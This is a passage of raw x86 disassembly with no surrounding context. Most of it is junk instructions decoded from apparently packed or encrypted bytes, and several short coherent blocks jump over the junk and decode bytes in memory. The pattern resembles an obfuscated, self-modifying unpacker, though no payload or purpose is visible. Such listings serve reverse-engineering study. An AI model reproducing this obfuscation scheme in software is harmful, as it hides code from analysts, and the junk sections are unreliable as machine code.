  402932:	add    al,0xdc
  402934:	and    eax,DWORD PTR [edx+0xe71b5a2]
  40293a:	fcmovnb st,st(2)
  40293c:	adc    cl,dh
  40293e:	ds push edx
  402940:	out    dx,eax
  402941:	dec    edx
  402942:	push   ds
  402943:	lea    ebx,[ecx+0x60cbb93e]
  402949:	fs pop edx
  40294b:	jno    0x402955
  40294d:	xor    DWORD PTR [edi-0x1e],eax
  402950:	sbb    cl,dh
  402952:	ret    0x16dd
  402955:	in     eax,dx
  402956:	sub    al,0x83
  402958:	stc    
  402959:	push   DWORD PTR [ebx+0x17853b48]
  40295f:	xor    BYTE PTR [ebx+0x18],0xe5
  402963:	rol    ch,cl
  402965:	jle    0x4029cb
  402967:	stos   BYTE PTR es:[edi],al
  402968:	ds push 0x24511653
  40296e:	ins    DWORD PTR es:[edi],dx
  40296f:	sub    edx,edi
  402971:	mov    ebx,0x3adfd8d3
  402976:	imul   ecx,DWORD PTR [ebp+0x15],0x77
  40297a:	mov    dh,0xd6
  40297c:	out    dx,al
  40297d:	mov    dl,0x45
  40297f:	xor    dh,dh
  402981:	ins    BYTE PTR es:[edi],dx
  402982:	je     0x4029ac
  402984:	arpl   WORD PTR [ebp+0x7d620f0d],cx
  40298a:	enter  0xe926,0x71
  40298e:	and    BYTE PTR [ebp+0x51c9f934],cl
  402994:	push   esi
  402995:	repz jne 0x40294c
  402998:	sti    
  402999:	push   0x53873005
  40299e:	into   
  40299f:	aad    0x35
  4029a1:	cld    
  4029a2:	icebp  
  4029a3:	pop    es
  4029a4:	adc    al,0x58
  4029a6:	std    
  4029a7:	cli    
  4029a8:	sbb    al,ch
  4029aa:	mov    bh,BYTE PTR [edi-0x70]
  4029ad:	(bad)  
  4029ae:	adc    BYTE PTR [ecx],cl
  4029b0:	sbb    ebp,ecx
  4029b2:	sti    
  4029b3:	xchg   edi,eax
  4029b4:	xchg   ebx,eax
  4029b5:	idiv   BYTE PTR [ecx-0x25]
  4029b8:	shr    BYTE PTR [esi-0x2d4323bd],cl
  4029be:	sbb    cl,BYTE PTR [edx]
  4029c0:	fld    QWORD PTR [edx-0x4030adcd]
  4029c6:	call   0xe5897e9d
  4029cb:	nop
  4029cc:	aad    0xe6
  4029ce:	pop    ecx
  4029cf:	dec    edi
  4029d0:	xor    BYTE PTR [ecx+0x56351bee],al
  4029d6:	rcl    DWORD PTR [eax+eax*4],1
  4029d9:	sti    
  4029da:	push   0xa8403219
  4029df:	push   edx
  4029e0:	dec    eax
  4029e1:	inc    eax
  4029e2:	xor    DWORD PTR [esi],edx
  4029e4:	nop
  4029e5:	hlt    
  4029e6:	xor    al,0x3e
  4029e8:	fucomip st,st(5)
  4029ea:	inc    edx
  4029eb:	cmp    esp,DWORD PTR ds:0xfb565acb
  4029f1:	push   esp
  4029f2:	call   0x9246b5
  4029f7:	pop    ecx
  4029f8:	gs pushf 
  4029fa:	mov    BYTE PTR [ebp-0x387bbae5],ah
  402a00:	hlt    
  402a01:	push   ebx
  402a02:	cmc    
  402a03:	outs   dx,BYTE PTR ds:[esi]
  402a04:	pop    eax
  402a05:	add    DWORD PTR [edi],ebx
  402a07:	xchg   BYTE PTR [esi-0x77],dl
  402a0a:	or     DWORD PTR [edx-0x8454737],ebp
  402a10:	cmc    
  402a11:	inc    eax
  402a12:	outs   dx,DWORD PTR ds:[esi]
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	popf   
  402a35:	arpl   WORD PTR [edx+0x7e0daa82],bp
  402a3b:	jle    0x402a37
  402a3d:	jg     0x402abd
  402a3f:	jle    0x4029d9
  402a41:	mov    dh,0x7c
  402a43:	xchg   ebx,eax
  402a44:	dec    esi
  402a45:	mov    cl,0xc8
  402a47:	push   0x875c174f
  402a4c:	rcr    DWORD PTR [edx],cl
  402a4e:	mov    bl,0xc8
  402a50:	mov    edx,0xccaae8f0
  402a55:	jbe    0x402a18
  402a57:	(bad)  
  402a58:	jae    0x402a03
  402a5a:	add    DWORD PTR [ecx+0x6b],0xffffffbc
  402a5e:	call   0x8fd412b8
  402a63:	or     al,0xa8
  402a65:	mov    cl,0xf5
  402a67:	push   ebp
  402a68:	sub    ebx,esp
  402a6a:	mov    eax,ds:0x6d106a86
  402a6f:	dec    edx
  402a70:	and    al,0x69
  402a72:	fnstsw WORD PTR [edx]
  402a74:	sub    DWORD PTR ds:0x745c8d6f,ecx
  402a7a:	pusha  
  402a7b:	jnp    0x402ac8
  402a7d:	mov    edx,0x3c950e9f
  402a82:	fwait
  402a83:	sbb    DWORD PTR ds:0x4f1d7d91,0x9f0fe100
  402a8d:	repnz sbb cl,ch
  402a90:	imul   BYTE PTR [edx]
  402a92:	aad    0x43
  402a94:	test   DWORD PTR [ecx-0x2],ebx
  402a97:	xor    esp,DWORD PTR [ebx-0x80]
  402a9a:	(bad)  
  402a9c:	in     al,dx
  402a9d:	ja     0x402a6a
  402a9f:	sub    eax,0x4b8ad4dd
  402aa4:	cli    
  402aa5:	sbb    bl,BYTE PTR [edx+0x2d]
  402aa8:	aas    
  402aa9:	repnz repz sbb ecx,DWORD PTR [ecx]
  402aad:	mov    eax,ds:0x24b4622d
  402ab2:	xor    ebx,ebx
  402ab4:	mov    ebp,0xd98c5f75
  402ab9:	retf   
  402aba:	(bad)  
  402abb:	stc    
  402abc:	mov    ds:0x39f48d81,eax
  402ac1:	mov    ch,0xdc
  402ac3:	scas   al,BYTE PTR es:[edi]
  402ac4:	icebp  
  402ac5:	mov    ah,0x0
  402ac7:	push   esi
  402ac8:	in     eax,0x21
  402aca:	mov    ds:0x1b61df80,eax
  402acf:	add    eax,eax
  402ad1:	dec    ecx
  402ad2:	ror    BYTE PTR [ebp-0x62ddbb78],cl
  402ad8:	scas   al,BYTE PTR es:[edi]
  402ad9:	mov    ch,0xa
  402adb:	sub    DWORD PTR [ebx+0x15],edi
  402ade:	cmp    eax,0x82e7f835
  402ae3:	daa    
  402ae4:	mov    ebp,DWORD PTR [ecx-0x12]
  402ae7:	pop    ds
  402ae8:	lock mov ds:0x7755704d,al
  402aee:	xor    ebx,ebx
  402af0:	mov    eax,ds:0xbb5125c8
  402af5:	sbb    eax,0xd8196526
  402afa:	jg     0x402b5e
  402afc:	retf   0x1d0e
  402aff:	add    al,0x3e
  402b01:	in     eax,dx
  402b02:	ret    0x9cb8
  402b05:	cwde   
  402b06:	lock test DWORD PTR ss:[edx-0x55],0x5288b465
  402b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b10:	mov    DWORD PTR [edx+ecx*2],ebx
  402b13:	push   ss
  402b14:	jg     0x402aac
  402b16:	mov    dl,0x3c
  402b18:	mov    al,0x18
  402b1a:	cmp    eax,DWORD PTR [eax+0x369d0169]
  402b20:	in     al,dx
  402b21:	mov    esi,0xc4a41a15
  402b26:	(bad)  
  402b27:	fst    QWORD PTR [ebx+0x46]
  402b2a:	pop    ss
  402b2b:	mov    BYTE PTR [ebp+0x4794925],dh
  402b31:	jmp    0x916b:0x81af081
  402b38:	mov    BYTE PTR [eax+ebx*2],dh
  402b3b:	jo     0x402ac7
  402b3d:	dec    eax
  402b3e:	adc    bl,dl
  402b40:	sub    DWORD PTR [eax-0x6d],eax
  402b43:	outs   dx,DWORD PTR ds:[esi]
  402b44:	mov    ds:0xdbddacbb,al
  402b49:	scas   al,BYTE PTR es:[edi]
  402b4a:	add    edi,DWORD PTR [edi]
  402b4c:	hlt    
  402b4d:	pop    es
  402b4e:	ret    0x3e03
  402b51:	fidiv  DWORD PTR [eax]
  402b53:	aad    0xea
  402b55:	push   ds
  402b56:	jae    0x402afe
  402b58:	xchg   bh,bh
  402b5a:	aad    0x11
  402b5c:	fmulp  st(4),st
  402b5e:	push   cs
  402b5f:	xor    ecx,DWORD PTR [ecx]
  402b61:	pusha  
  402b62:	(bad)  
  402b63:	jmp    0x9571:0xe7902a19
  402b6a:	xor    ebx,edx
  402b6c:	inc    ecx
  402b6d:	hlt    
  402b6e:	loopne 0x402b63
  402b70:	fdivr  st,st(3)
  402b72:	out    dx,al
  402b73:	lods   al,BYTE PTR ds:[esi]
  402b74:	inc    esi
  402b75:	mov    bh,0xd2
  402b77:	fmulp  st(1),st
  402b79:	into   
  402b7a:	inc    edx
  402b7b:	mov    bh,0xea
  402b7d:	jns    0x402bf2
  402b7f:	push   es
  402b80:	jne    0x402b68
  402b82:	jns    0x402bad
  402b84:	or     bh,BYTE PTR [edi-0x6be0155d]
  402b8a:	xlat   BYTE PTR ds:[ebx]
  402b8b:	mov    dl,0x45
  402b8d:	or     ecx,DWORD PTR [esi-0x2e55d189]
  402b93:	mov    ds:0x77addd2d,eax
  402b98:	jmp    0x402bfd
  402b9a:	fidivr DWORD PTR [eax]
  402b9c:	pop    esi
  402b9d:	jno    0x402b86
  402b9f:	push   eax
  402ba0:	out    dx,eax
  402ba1:	out    dx,eax
  402ba2:	sub    ebp,0xffffffa5
  402ba5:	pop    esp
  402ba6:	and    DWORD PTR [ebp-0x4529d6fb],ecx
  402bac:	stos   DWORD PTR es:[edi],eax
  402bad:	repz iret 
  402baf:	int    0xce
  402bb1:	jbe    0x402bc9
  402bb3:	(bad)
  402bb8:	scas   al,BYTE PTR es:[edi]
  402bb9:	rol    DWORD PTR [edx-0x676bee35],cl
  402bbf:	add    esp,DWORD PTR [ecx]
  402bc1:	cmp    ecx,eax
  402bc3:	jp     0x402b4a
  402bc5:	ror    BYTE PTR [edi],0x84
  402bc8:	sub    BYTE PTR [eax],al
  402bca:	add    BYTE PTR [eax],al
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	adc    BYTE PTR ds:0xb361375,al
  402c17:	jle    0x402c97
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c38
  402c1e:	cmp    edi,DWORD PTR [edi-0x5fc7e3e0]
  402c24:	(bad)  
  402c26:	js     0x402c20
  402c28:	dec    ebx
  402c29:	scas   al,BYTE PTR es:[edi]
  402c2a:	pop    ebp
  402c2b:	xchg   esi,eax
  402c2c:	in     al,0x10
  402c2e:	retf   
  402c2f:	xchg   ebx,eax
  402c30:	ret    
  402c31:	mov    bh,0x61
  402c33:	mov    es,edi
  402c35:	jb     0x402c7d
  402c37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c38:	mov    cl,0xe0
  402c3a:	jne    0x402c0f
  402c3c:	adc    DWORD PTR [eax-0x22da2c5b],0xbf203c41
  402c46:	push   cs
  402c47:	mov    ebp,0x667338d0
  402c4c:	ins    BYTE PTR es:[edi],dx
  402c4d:	add    eax,0x61a160b4
  402c52:	jmp    0xdec6:0x33bbe03b
  402c59:	cmp    al,0xbc
  402c5b:	push   esp
  402c5c:	and    ah,BYTE PTR [eax+0x10]
  402c5f:	popw   es
  402c61:	shl    bh,cl
  402c63:	shr    edx,1
  402c65:	dec    esi
  402c66:	pusha  
  402c67:	sbb    al,0xb2
  402c69:	push   ecx
  402c6a:	repnz daa 
  402c6c:	(bad)  
  402c6d:	pop    eax
  402c6e:	stos   BYTE PTR es:[edi],al
  402c6f:	adc    BYTE PTR [edi+0x3368aa76],0xc2
  402c76:	mov    ecx,0xae539ab7
  402c7b:	mov    ebp,0x6ec55209
  402c80:	fstp   QWORD PTR [eax]
  402c82:	mov    bl,0xb2
  402c84:	xor    al,0xc1
  402c86:	shr    DWORD PTR [edx-0x5d],0xb7
  402c8a:	and    al,0xce
  402c8c:	sub    eax,0x47066072
  402c91:	std    
  402c92:	out    dx,al
  402c93:	jne    0x402cb5
  402c95:	in     eax,dx
  402c96:	adc    ebx,0x4be45f8a
  402c9c:	(bad)  
  402c9d:	in     al,0x57
  402c9f:	jl     0x402c35
  402ca1:	or     ebx,eax
  402ca3:	sbb    bl,cl
  402ca5:	jmp    0x402c46
  402ca7:	(bad)
  402caa:	inc    eax
  402cab:	cld    
  402cac:	popa   
  402cad:	add    eax,0xd57aa171
  402cb2:	cmp    eax,esp
  402cb4:	mov    DWORD PTR [esp+edi*8],edx
  402cb7:	out    dx,al
  402cb8:	shr    DWORD PTR [esi-0x40777b72],1
  402cbe:	call   0x9233fd2f
  402cc3:	and    ch,BYTE PTR ds:0x4ed9313d
  402cc9:	setns  BYTE PTR [ebp+eax*4+0x147b15f]
  402cd1:	pop    ecx
  402cd2:	push   ebp
  402cd3:	shl    dl,cl
  402cd5:	mov    edx,DWORD PTR [edi+0x34]
  402cd8:	fwait
  402cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cda:	into   
  402cdb:	rol    DWORD PTR [ebx-0x15f224f7],cl
  402ce1:	xchg   DWORD PTR [ecx+0x31f2c934],ecx
  402ce7:	xchg   edi,eax
  402ce8:	mov    eax,ds:0x2dabf95d
  402ced:	fcomp  DWORD PTR [eax]
  402cef:	repz jle 0x402c76
  402cf2:	inc    edi
  402cf3:	sub    ebp,DWORD PTR [eax+ebx*2]
  402cf6:	les    ebx,FWORD PTR [edi-0x4c38bba3]
  402cfc:	push   esp
  402cfd:	cli    
  402cfe:	bound  eax,QWORD PTR [esi+0x8]
  402d01:	push   0x9f8a66cf
  402d06:	(bad)  [esi]
  402d08:	push   ebx
  402d09:	push   esi
  402d0a:	sbb    ah,BYTE PTR [eax+0x63]
  402d0d:	sti    
  402d0e:	sti    
  402d0f:	push   es
  402d10:	aam    0x35
  402d12:	pusha  
  402d13:	ss adc eax,0x546a7feb
  402d19:	mov    ah,0xe9
  402d1b:	pop    ebx
  402d1c:	xchg   bl,al
  402d1e:	scas   al,BYTE PTR es:[edi]
  402d1f:	lods   eax,DWORD PTR ds:[esi]
  402d20:	jns    0x402cf0
  402d22:	cmp    ah,BYTE PTR [esi-0x6d79b14]
  402d28:	add    DWORD PTR [ebx+0x4f],ecx
  402d2b:	(bad)  
  402d2c:	pop    ds
  402d2d:	(bad)  
  402d2e:	ret    
  402d2f:	(bad)  
  402d30:	rcr    BYTE PTR [ebp+0x527d4b2d],1
  402d36:	pop    ss
  402d37:	int3   
  402d38:	cdq    
  402d39:	push   ds
  402d3a:	mov    edx,0x35b1ab73
  402d3f:	push   esp
  402d40:	cmp    ebp,DWORD PTR [ebx+0x17138a55]
  402d46:	aad    0xda
  402d48:	or     DWORD PTR [edi-0x1e2838ba],ebp
  402d4e:	outs   dx,DWORD PTR ds:[esi]
  402d4f:	aaa    
  402d50:	retf   
  402d51:	ret    0x48bd
  402d54:	lock or BYTE PTR [eax+0x5bb50595],dl
  402d5b:	popf   
  402d5c:	adc    al,0x5c
  402d5e:	pop    esp
  402d5f:	addr16 mov es,edx
  402d62:	std    
  402d63:	dec    esi
  402d64:	loope  0x402cf6
  402d66:	cwde   
  402d67:	push   ebp
  402d68:	add    al,0x76
  402d6a:	mov    BYTE PTR [edx-0x11b45679],ah
  402d70:	mov    eax,0x7661c70a
  402d75:	dec    edi
  402d76:	int    0x28
  402d78:	pop    ebp
  402d79:	sbb    DWORD PTR [ebx+0x14bb5a26],esp
  402d7f:	mov    bh,0x61
  402d81:	ror    DWORD PTR [edi-0xeb872ef],0xf0
  402d88:	popf   
  402d89:	mov    bh,0x8
  402d8b:	adc    al,0x69
  402d8d:	mov    fs,WORD PTR [ebp-0x91a87eb]
  402d93:	aaa    
  402d94:	in     eax,0xe5
  402d96:	test   al,0xb7
  402d98:	cdq    
  402d99:	in     al,dx
  402d9a:	call   0x496c24ce
  402d9f:	pop    ss
  402da0:	xchg   ebp,eax
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [eax+eax*2-0x77],1
  402de7:	mov    ebx,0x7e08b2ce
  402dec:	jle    0x402de8
  402dee:	jg     0x402e6e
  402df0:	jle    0x402df7
  402df2:	mov    al,0x30
  402df4:	daa    
  402df5:	mov    bl,0xa4
  402df7:	jno    0x402dcf
  402df9:	and    al,0xe2
  402dfb:	mov    ax,WORD PTR ds:0x426b48d9
  402e02:	cmp    al,0xae
  402e04:	mov    ebx,0x453c7e6b
  402e09:	push   edi
  402e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e0b:	enter  0x7393,0x57
  402e0f:	mul    DWORD PTR [edx+0x7f]
  402e12:	inc    esi
  402e13:	adc    al,0xfa
  402e15:	add    ebp,ebx
  402e17:	add    BYTE PTR [esi+0x35],ch
  402e1a:	add    eax,0x27406c11
  402e1f:	gs mov eax,0xf0a236f6
  402e25:	aad    0x47
  402e27:	and    eax,0xf2c51ec
  402e2c:	dec    eax
  402e2d:	mov    eax,0x5b2b9cb9
  402e32:	push   esi
  402e33:	push   es
  402e34:	out    dx,al
  402e35:	push   edx
  402e36:	mov    esi,0xc23d162d
  402e3b:	sub    ebx,DWORD PTR [esi]
  402e3d:	ror    DWORD PTR [edx+0x31],cl
  402e40:	bound  esi,QWORD PTR [eax-0x3e]
  402e43:	jo     0x402eb5
  402e45:	repnz stc 
  402e47:	fs sbb dl,bh
  402e4a:	xor    BYTE PTR [eax],0xa2
  402e4d:	ret    0x4e5c
  402e50:	adc    eax,0x7bc06113
  402e55:	sti    
  402e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e57:	ins    DWORD PTR es:[edi],dx
  402e58:	sub    eax,0x22e42d9
  402e5d:	push   esi
  402e5e:	xchg   esp,eax
  402e5f:	dec    ecx
  402e60:	add    cl,BYTE PTR [ebp+eax*4-0xf]
  402e64:	es std 
  402e66:	loop   0x402e8e
  402e68:	mov    WORD PTR [edx],gs
  402e6a:	ss inc ecx
  402e6c:	dec    ebp
  402e6d:	push   0xac1899e0
  402e72:	pushf  
  402e73:	cmp    al,0x76
  402e75:	pop    es
  402e76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e77:	in     eax,0x3
  402e79:	add    ebx,DWORD PTR [ebp-0x1f]
  402e7c:	ins    BYTE PTR es:[edi],dx
  402e7d:	add    esi,DWORD PTR [ebx-0x5e8f874d]
  402e83:	and    ah,BYTE PTR ds:[esi]
  402e86:	mov    eax,0xd1a30956
  402e8b:	inc    eax
  402e8c:	jnp    0x402e32
  402e8e:	mov    edi,0xc1dae46
  402e93:	and    edi,DWORD PTR [esi]
  402e95:	cmp    DWORD PTR [edx-0x7a],ebx
  402e98:	dec    ebp
  402e99:	sbb    DWORD PTR [edi],edx
  402e9b:	bound  ebp,QWORD PTR [edi]
  402e9d:	xor    BYTE PTR [edi-0x7f2a2032],ch
  402ea3:	in     al,dx
  402ea4:	fild   QWORD PTR [edx+0x4c]
  402ea7:	xor    bl,BYTE PTR [edx-0x1c4a7c36]
  402ead:	add    bh,BYTE PTR [ebx+0x574e4d49]
  402eb3:	add    edi,DWORD PTR [eax*1-0x28f90f0a]
  402eba:	and    eax,0x64ef126e
  402ebf:	push   ebx
  402ec0:	outs   dx,DWORD PTR ds:[esi]
  402ec1:	sahf   
  402ec2:	retf   
  402ec3:	pop    ebp
  402ec4:	xchg   ecx,eax
  402ec5:	add    esi,DWORD PTR [eax]
  402ec7:	add    al,0xd7
  402ec9:	out    dx,al
  402eca:	cmp    ecx,DWORD PTR [ebp+0x67]
  402ecd:	inc    BYTE PTR [edi-0x11]
  402ed0:	icebp  
  402ed1:	aad    0x51
  402ed3:	mov    bh,0x84
  402ed5:	mov    edx,0x8ed6ee7d
  402eda:	gs clc 
  402edc:	mov    eax,0x80bfda4d
  402ee1:	scas   eax,DWORD PTR es:[edi]
  402ee2:	push   ds
  402ee3:	push   0x6f2035ea
  402ee8:	fild   DWORD PTR [edi+0x6c]
  402eeb:	inc    esp
  402eec:	div    BYTE PTR [edx-0x7b]
  402eef:	mov    ds:0xcb75401d,eax
  402ef4:	mov    edx,0x7959b081
  402ef9:	mov    ecx,0x2c4c28a3
  402efe:	cdq    
  402eff:	lock daa 
  402f01:	enter  0x7a32,0xe6
  402f05:	enter  0xfb2b,0x84
  402f09:	jno    0x402f7e
  402f0b:	fimul  DWORD PTR [esp+ebp*1]
  402f0e:	mov    ss,esi
  402f10:	mov    ebx,0x88f4c23
  402f15:	jmp    0x402f18
  402f17:	cmc    
  402f18:	cs jge 0x402ecf
  402f1b:	jmp    0x402ed7
  402f1d:	and    ecx,DWORD PTR [eax+0x28f1451c]
  402f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f24:	dec    eax
  402f25:	int3   
  402f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f27:	adc    DWORD PTR [edx+ecx*8-0x1],edi
  402f2b:	mov    BYTE PTR [esi],cl
  402f2d:	(bad)  
  402f2e:	je     0x402f55
  402f30:	push   0xa81d295
  402f35:	mov    ebx,0x56a7d695
  402f3a:	lahf   
  402f3b:	imul   ecx,esi,0xffffff9c
  402f3e:	lock xchg esp,eax
  402f40:	(bad)  [ebx+0x45]
  402f43:	(bad)  [edi+0x15321618]
  402f49:	mov    al,0x1b
  402f4b:	dec    edx
  402f4c:	lds    edi,FWORD PTR [edi+0x6f67ef9a]
  402f52:	or     ebx,DWORD PTR [edi-0x4f]
  402f55:	jno    0x402fc1
  402f57:	jmp    0xb7aa:0x3e4e298d
  402f5e:	dec    esp
  402f5f:	test   BYTE PTR [eax+0x48c09482],bl
  402f65:	sub    BYTE PTR [eax-0x4b],dh
  402f68:	lds    esp,FWORD PTR ds:0xf6e34fa5
  402f6e:	scas   al,BYTE PTR es:[edi]
  402f6f:	loop   0x402f96
  402f71:	add    BYTE PTR [ebp-0x1d],ah
  402f74:	push   ecx
  402f75:	lea    eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x5851a5b7]
  402fae:	mov    ah,0xe6
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402fd2
  402fb9:	adc    esp,DWORD PTR [ebx+edi*8+0x260b1fb4]
  402fc0:	bound  ebx,QWORD PTR [eax+ebp*4]
  402fc3:	push   eax
  402fc4:	fnsave [edx+0xa28f2a8]
  402fca:	mov    ebx,0x13ad4125
  402fcf:	jbe    0x40304b
  402fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fd2:	das    
  402fd3:	into   
  402fd4:	xor    edi,DWORD PTR [edi]
  402fd6:	neg    BYTE PTR [ebp+0x54]
  402fd9:	in     eax,0x80
  402fdb:	lds    eax,FWORD PTR [esi]
  402fdd:	cs push esp
  402fdf:	in     ax,dx
  402fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fe2:	popf   
  402fe3:	lods   eax,DWORD PTR ds:[esi]
  402fe4:	popa   
  402fe5:	pop    edx
  402fe6:	outs   dx,DWORD PTR ds:[esi]
  402fe7:	xor    DWORD PTR [esi-0x14946a93],edx
  402fed:	out    dx,eax
  402fee:	jge    0x402f8c
  402ff0:	sub    al,0x6f
  402ff2:	mov    ebx,0x86861db4
  402ff7:	mov    BYTE PTR [ebx],ah
  402ff9:	iret   
  402ffa:	mov    al,0xc
  402ffc:	pop    edx
  402ffd:	in     al,0xe0
  402fff:	retf   
  403000:	or     al,bh
  403002:	in     al,dx
  403003:	leave  
  403004:	and    esp,ebx
  403006:	adc    BYTE PTR [esi],al
  403008:	dec    esi
  403009:	cdq    
  40300a:	test   dh,bh
  40300c:	lahf   
  40300d:	sub    BYTE PTR [edi+eax*8-0x2b61ef40],cl
  403014:	add    esp,edi
  403016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403017:	pop    es
  403018:	sbb    eax,0x769df03c
  40301d:	inc    ecx
  40301e:	out    dx,eax
  40301f:	pop    esi
  403020:	mov    ebx,0x3013efea
  403025:	adc    BYTE PTR ds:0xe8f311e5,0xc4
  40302c:	or     cl,BYTE PTR [edi]
  40302e:	lahf   
  40302f:	shr    DWORD PTR [edi-0x4427632],0x75
  403036:	inc    esp
  403038:	jbe    0x403052
  40303a:	fst    DWORD PTR [ebp+0x5a]
  40303d:	push   edx
  40303e:	clc    
  40303f:	cli    
  403040:	enter  0xa44e,0x9
  403044:	into   
  403045:	or     bl,BYTE PTR [esi-0x6a]
  403048:	jp     0x40302f
  40304a:	pushf  
  40304b:	inc    ecx
  40304c:	stos   DWORD PTR es:[edi],eax
  40304d:	ss cmp cl,bh
  403050:	and    BYTE PTR [ecx],bl
  403052:	ss xchg edx,eax
  403054:	and    ecx,DWORD PTR [edi+0x4e]
  403057:	mul    BYTE PTR [ebp-0x33c2494e]
  40305d:	mov    ds:0x324c8b00,eax
  403062:	pop    ecx
  403063:	push   edx
  403064:	and    eax,0x17f81284
  403069:	jecxz  0x40300b
  40306b:	mov    eax,0xf78b16ca
  403070:	push   eax
  403071:	shl    ebp,1
  403073:	pop    ss
  403074:	sbb    DWORD PTR [ebx],edi
  403076:	and    DWORD PTR [edi-0x56],0xffffffa9
  40307a:	mov    WORD PTR [esi+0x72],cs
  40307d:	aad    0x1f
  40307f:	inc    ecx
  403080:	shl    edi,1
  403082:	ret    
  403083:	mov    fs,edx
  403085:	clc    
  403086:	lea    ebx,[ecx]
  403088:	mov    ebp,0x2d4f756c
  40308d:	xlat   BYTE PTR ds:[ebx]
  40308e:	popa   
  40308f:	mov    esi,gs
  403091:	jge    0x403022
  403093:	cmp    eax,0xfd09f77d
  403098:	add    al,0xf3
  40309a:	jle    0x4030f9
  40309c:	sti    
  40309d:	leave  
  40309e:	and    edi,edx
  4030a0:	mov    WORD PTR [ecx],ss
  4030a2:	sub    DWORD PTR [ebx-0x6f7de6cb],edx
  4030a8:	(bad)  
  4030a9:	jmp    DWORD PTR [eax+0x6114eedb]
  4030af:	(bad)  [ecx+0x2091cb9b]
  4030b5:	call   0xfb81:0x432a1ae4
  4030bc:	mov    eax,ds:0x7161ed94
  4030c1:	rcr    DWORD PTR [edi],0xbe
  4030c4:	inc    ebx
  4030c5:	cmp    al,0x5
  4030c7:	test   DWORD PTR [edi],0x6494f5e7
  4030cd:	jno    0x403148
  4030cf:	scas   eax,DWORD PTR es:[edi]
  4030d0:	outs   dx,DWORD PTR ds:[esi]
  4030d1:	out    0xa7,eax
  4030d3:	mov    dl,0x60
  4030d5:	dec    ebp
  4030d6:	or     eax,0x7c94a6d3
  4030db:	ror    BYTE PTR [eax],cl
  4030dd:	mov    eax,eax
  4030df:	push   eax
  4030e0:	jne    0x4030bb
  4030e2:	mov    al,ds:0x83d0dcfd
  4030e7:	jmp    0x775e:0x6c6c4828
  4030ee:	je     0x403159
  4030f0:	or     bl,dl
  4030f2:	or     DWORD PTR [edx],esi
  4030f4:	ins    DWORD PTR es:[edi],dx
  4030f5:	js     0x4030c9
  4030f7:	in     al,dx
  4030f8:	push   cs
  4030f9:	push   0xc6b5b861
  4030fe:	mov    al,0x4a
  403100:	rcl    BYTE PTR [esi+0x64],0xdd
  403104:	adc    DWORD PTR [edx-0x274c00c9],esp
